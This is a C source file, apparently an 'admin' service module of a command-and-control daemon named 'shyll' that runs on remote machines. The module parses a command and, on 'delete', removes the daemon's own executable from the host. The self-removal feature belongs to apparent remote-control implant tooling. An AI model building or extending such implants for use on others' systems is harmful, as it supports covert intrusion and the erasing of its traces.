#include "admin_service.h"
#include "cncdaemon.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <linux/limits.h>

static int delete_self() {
    char path_buffer[PATH_MAX];

    if (readlink("/proc/self/exe", path_buffer, sizeof(path_buffer)) < 0) {
        fprintf(stderr, "Could not delete self, error occurred.\n");
        return 0;
    }

    if (access(path_buffer, F_OK) != 0)
        return 1;

    if (remove(path_buffer) != 0) {
        fprintf(stderr, "Error occurred attempting to remove \"%s\"\n", path_buffer);
        return 0;
    }

    return 1;
}

static void print_usage(FILE* command_out) {
    fprintf(command_out, "admin - CNC Admin service.\n\n");
    fprintf(command_out, "Usage:\n"
        "  admin <verb>\n\n"
        "  admin help/h/?\n"
        "    Prints this help output\n\n"
        "  admin delete\n"
        "    Deletes the shyll executable off of the remote machine.\n"
        );
}

static int admin_entry(void* _ctx, char** argv, int argc, FILE* command_out)
{
    if (strcmp(argv[0], "admin") != 0)
        return 0;

    if (argc != 2)
        print_usage(command_out);
    else if (strcmp(argv[1], "delete") == 0) {
        if (delete_self())
            fprintf(command_out, "Deleted shyll from host machine.\n");
        else
            fprintf(command_out, "Error uninstalling.\n");
    } else if (strcmp(argv[1], "help") == 0) {
        print_usage(command_out);
    } else {
        fprintf(command_out, "Unrecognized verb \"%s\". Please see help.\n", argv[1]);
        print_usage(command_out);
    }

    return 1;
}

void admin_startup(struct cncdaemon_service* dest)
{
    dest->userdata = 0;
    dest->handler = admin_entry;
}

void admin_shutdown(struct cncdaemon_service* service)
{
    free(service);
}